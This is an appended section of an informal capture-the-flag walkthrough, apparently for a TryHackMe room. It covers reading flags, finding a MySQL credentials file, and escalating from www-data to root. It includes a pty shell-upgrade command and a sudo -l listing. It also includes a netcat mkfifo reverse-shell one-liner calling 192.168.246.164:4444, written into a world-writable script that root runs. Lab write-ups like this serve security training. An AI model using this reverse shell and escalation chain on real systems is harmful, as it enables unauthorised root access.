@@ -232,3 +232,100 @@ function printit ($string) {
 ```
 
 This gave me the shell into my listener.
+
+After it i went into filesytem and there i got the answer of our first quesiton that is
+
+What is user flag?
+
+It is stored in the /home/itguy/user.txt.
+
+There was also a file there in the location /home/itguy
+
+it was mysql_login.txt
+
+It cotains and username  and password in the format 
+
+Username:Password
+
+And i was able to login and inspect the database but not before upgrading the raw shell to full tty shell with 
+
+```python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Then only with the  command 
+
+mysql -u rice -p
+
+I could login with correct password.
+
+Now we're moving towards the step of privilage escalation with checking misconfigured binaries with
+
+```bash
+sudo -l
+```
+
+And its output was
+
+sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+And yup the current user "www-data" could run the backup.pl file as root.
+
+Moreover, The script /home/itguy/backup.pl can be run as root without root password with the help of only single file named /usr/bin/perl
+
+With the command 
+
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+But since when viewing the permission of the file backup.pl we cannnot control the backup.pl file cuz of it permission assigned to it.
+
+But if we see what is actully inside the file backup.pl.
+
+this is the content
+
+```bash
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+```
+This short code is running another file named copy.sh into the folder /etc/
+
+And if we see the permission of the file copy.sh we see we have write permission of this file
+
+-rw-r--rwx 1 root root 81 Nov 29  2019 copy.sh
+
+As we are now going to attach a rev shell that will be helpful in getting the root shell.
+
+If that rev shell will be run as root we will definetly get the shell as root.
+So we are here now going to change the contents of copy.sh as we have write permission of the file with the command 
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.246.164 4444 >/tmp/f" > copy.sh
+
+Adjust the IP and PORT as per you requirement.
+
+Now after doing so we are going to execute the /home/itguy/backup.pl
+
+Which  will do a domino effect and leading to execute the copy.sh as root cuz of the content inside the backup.pl
+
+The next executing command from us is 
+
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+At the same time before executing the above command 
+
+We have our listerner setup on the local machine as we execute that above commadn 
+
+We got our root shell and yet there i could read the content of root flag at the location
+
+/root/root.txt
+
+And in this way we will get our answer of our 2nd question that is what is the root flag.
+
+And Yup!! the room is solved.
